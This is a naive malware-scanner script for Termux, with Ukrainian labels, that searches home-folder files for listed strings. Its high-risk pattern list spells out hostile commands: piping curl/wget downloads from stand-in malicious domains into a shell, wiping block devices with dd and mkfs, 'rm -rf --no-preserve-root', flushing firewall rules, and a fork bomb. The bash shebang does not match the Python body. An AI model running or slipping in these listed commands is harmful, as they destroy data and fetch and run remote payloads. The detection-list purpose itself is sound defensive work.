#!/data/data/com.termux/files/usr/bin/bash
import os
import sys
import time

# ============================================
#   TBFPUMBA-SckanerOp v2.1
#   by TBFPUMBA — Technology. Security. Efficiency.
# ============================================

# 🟢 Підозрілі паттерни (жовтий рівень)
SUSPICIOUS_PATTERNS = [
    "rm -rf",
    "format",
    "delete_all",
    "malware",
    "virus"
]

# 🔴 КРИТИЧНІ паттерни (червоний рівень) - реальна загроза
HIGH_RISK_PATTERNS = [
    "rm -rf --no-preserve-root",
    "dd if=/dev/zero of=/dev/block",
    "mkfs.ext4 /dev/block",
    "chmod 777 /system",
    "mount -o rw,remount /system",
    "curl http://malicious-site.com/install.sh | bash",
    "wget https://evil-domain.com/payload.sh | sh",
    "base64 -d | sh",
    "eval $(cat /dev/urandom | base64)",
    "iptables -F",
    "iptables -X",
    "killall -9",
    "pkill -f",
    ":(){ :|:& };:"   # fork bomb
]

def loading_animation():
    print("\n🔍 Ініціалізація сканера TBFPUMBA...")
    for i in range(101):
        time.sleep(0.015)
        print(f"\r[{ '█' * (i//2) }{ '░' * (50 - i//2) }] {i}%", end="")
    print("\n✅ Сканер готовий до роботи!\n")

def ask_user():
    while True:
        answer = input("⚠️ Запустити сканування? (y/n): ").lower()
        if answer in ['y', 'yes']:
            return True
        elif answer in ['n', 'no']:
            print("❌ Сканування скасовано.")
            sys.exit()
        else:
            print("❗ Введіть 'y' або 'n'.")

def scan_file(filepath):
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
            # Перевірка на критичні загрози (червоний)
            for pattern in HIGH_RISK_PATTERNS:
                if pattern in content:
                    return "🔴", pattern
            # Перевірка на підозрілі (жовтий)
            for pattern in SUSPICIOUS_PATTERNS:
                if pattern in content:
                    return "🟡", pattern
    except Exception:
        pass
    return None, None

def scan_folder(path):
    suspicious_files = []
    print(f"\n📂 Сканування папки: {path}\n")
    for root, dirs, files in os.walk(path):
        for file in files:
            filepath = os.path.join(root, file)
            if filepath == os.path.realpath(__file__):
                continue
            if file.endswith(('.txt', '.sh', '.py', '.js', '.c', '.cpp', '.bash', '.zsh')):
                level, pattern = scan_file(filepath)
                if level:
                    suspicious_files.append((filepath, level, pattern))
                    if level == "🔴":
                        print(f"🔴 КРИТИЧНА ЗАГРОЗА: {filepath} (знайдено: '{pattern}')")
                    else:
                        print(f"🟡 ПІДОЗРІЛИЙ ФАЙЛ: {filepath} (знайдено: '{pattern}')")
    return suspicious_files

if __name__ == "__main__":
    os.system('clear')
    print("🔥 TBFPUMBA-SckanerOp v2.1 🔥")
    print("⚡ by TBFPUMBA — Technology. Security. Efficiency. ⚡")
    print("========================================")
    
    loading_animation()
    if not ask_user():
        sys.exit()
    
    target_path = os.path.expanduser("~")
    results = scan_folder(target_path)
    
    if results:
        critical = [r for r in results if r[1] == "🔴"]
        suspicious = [r for r in results if r[1] == "🟡"]
        
        if critical:
            print("\n🔴🔴🔴 КРИТИЧНІ ЗАГРОЗИ (терміново перевірити!):")
            for file, level, pattern in critical:
                print(f"  🔴 {file} (патерн: {pattern})")
        
        if suspicious:
            print("\n🟡 Підозрілі файли (рекомендується перевірити):")
            for file, level, pattern in suspicious:
                print(f"  🟡 {file} (патерн: {pattern})")
        
        print("\n⚠️ Рекомендується перевірити ці файли вручну.")
    else:
        print("\n✅ Підозрілих файлів не знайдено. Ваша система чиста!")
    
    print("\n🔒 Сканування завершено. Дякуємо, що використовуєте TBFPUMBA-SckanerOp!")
